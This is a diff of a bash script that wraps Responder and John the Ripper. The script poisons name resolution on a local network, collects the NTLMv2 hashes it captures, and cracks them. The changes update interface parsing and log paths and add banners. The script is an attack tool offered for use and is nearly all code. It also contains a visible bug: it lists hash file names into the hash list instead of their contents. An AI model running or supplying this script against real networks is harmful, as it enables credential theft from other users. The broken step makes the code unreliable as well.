@@ -13,8 +13,8 @@ echo "                                                          "
 echo " This Tool Uses Responder and John For Capturing & Cracking Password "
 echo -e "\e[1;31m----------------------------------------------------------\e[00m"
 echo "                                                          "
-ifconfig | grep "Link" | cut -d " " -f 1 >inter.tmp
-ifconfig | grep "inet addr" | cut -d ":" -f 2 | cut -d " " -f 1 >ip.tmp
+ifconfig | grep "UP" | cut -d ":" -f 1 >inter.tmp
+ifconfig | grep "inet " | cut -d " " -f 10 >ip.tmp
 echo -e "\e[1;32m----------------------------------------------------------\e[00m"
 echo "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
 echo "  +++++++++++++++ Available Interfaces:  +++++++++++++++ "
@@ -42,19 +42,25 @@ echo "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
 echo -e "\e[1;32m----------------------------------------------------------\e[00m"
 rm inter.tmp ip.tmp
 responder -i $ip -I $inter -r on -v -F on
-cd /usr/share/responder
+cd /usr/share/responder/logs
 echo -e "\e[1;32m----------------------------------------------------------\e[00m"
 echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
 echo " +++++++++++List of NTLMv2 hashes collected:+++++++++++++"
 echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
 echo -e "\e[1;32m-----------------------------------------------------------\e[00m"
-ls HTTP-NTLMv2-Client-*
-cat HTTP-NTLMv2-Client-* >/usr/share/responder/hashlist.txt
+ls *NTLM* >/usr/share/responder/hashlist.txt
+cat /usr/share/responder/hashlist.txt
+echo -e "\e[1;32m-----------------------------------------------------------\e[00m"
+echo -e "\e[1;32m------------------Total Hashes Found-----------------------\e[00m"
+echo -e "\e[1;32m-----------------------------------------------------------\e[00m"
 mkdir /usr/share/responder/oldhash
-mv /usr/share/responder/HTTP-NTLMv2-Client-* /usr/share/responder/oldhash
+mv /usr/share/responder/logs/*NTLM* /usr/share/responder/oldhash
 echo -e "\e[1;32m--------------------------------------------------------------------------------\e[00m"
 mkdir /usr/share/responder/Cracked
 mv /usr/share/responder/hashlist.txt /usr/share/responder/Cracked
+echo -e "\e[1;32m-----------------------------------------------------------\e[00m"
+echo -e "\e[1;32m----------------Launching John For Cracking----------------\e[00m"
+echo -e "\e[1;32m-----------------------------------------------------------\e[00m"
 john /usr/share/responder/Cracked/hashlist.txt
 echo "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
 echo "Use 'john --show /usr/share/responder/Cracked/hashlist.txt' Command to view the password "
